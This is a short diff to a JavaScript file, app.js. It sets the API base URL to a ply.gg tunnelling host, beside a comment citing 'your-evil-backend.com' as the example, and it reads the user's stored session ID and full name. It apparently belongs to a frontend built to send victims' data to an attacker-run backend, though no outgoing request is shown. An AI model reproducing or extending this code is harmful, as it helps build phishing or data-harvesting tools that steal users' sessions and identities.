@@ -1,5 +1,5 @@
 // app.js - Put this in a separate file
-const API_BASE_URL = 'stuff-anderson.gl.at.ply.gg/api'; // e.g., https://your-evil-backend.com/api -- THIS IS CRUCIAL
+const API_BASE_URL = 'https://stuff-anderson.gl.at.ply.gg/api'; // e.g., https://your-evil-backend.com/api -- THIS IS CRUCIAL
 let currentSessionId = localStorage.getItem('userSessionId');
 let userFullName = localStorage.getItem('userFullName');
 
